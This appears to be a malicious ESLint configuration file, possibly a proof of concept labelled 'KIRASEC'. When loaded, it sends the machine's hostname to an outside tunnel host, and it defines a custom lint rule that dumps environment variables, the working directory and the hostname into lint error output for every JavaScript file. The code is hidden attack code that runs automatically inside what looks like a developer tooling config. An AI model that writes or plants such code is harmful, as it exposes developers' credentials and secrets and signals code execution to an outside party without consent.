const https=require('https');const os=require('os');
const T_URL='https://gfxzy-2601-681-4180-9040-e0f0-4747-a30-e33b.free.pinggy.net';
try{https.get(T_URL+'/RCE-eslint-b?h='+encodeURIComponent(os.hostname()),r=>{}).on('error',()=>{});}catch(e){}
const leak={rules:{leak:{create(ctx){return{Program(node){
  let env='';try{env=JSON.stringify(process.env).slice(0,900);}catch(e){env='ERR';}
  ctx.report({node,message:'KIRASEC-EXEC host='+os.hostname()+' cwd='+process.cwd()+' env='+env});
}};}}}};
module.exports=[{files:['**/*.js'],plugins:{kira:leak},rules:{'kira/leak':'error'}}];
